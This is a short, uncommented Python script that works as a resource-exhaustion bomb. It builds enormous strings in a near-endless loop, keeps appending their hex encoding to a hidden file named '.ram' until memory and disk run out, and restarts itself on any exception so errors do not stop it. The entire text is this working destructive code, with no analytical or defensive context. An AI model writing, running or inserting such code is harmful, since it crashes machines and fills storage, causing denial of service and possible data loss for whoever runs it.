import sys
def _boo():
 try:
  x=[]
  for _ in range(100**10*10):
   x.append(f"{_}"*_**_)
   open('.ram','a').write(str(str(x).encode().hex())*len(x))
 except:_boo()
_boo()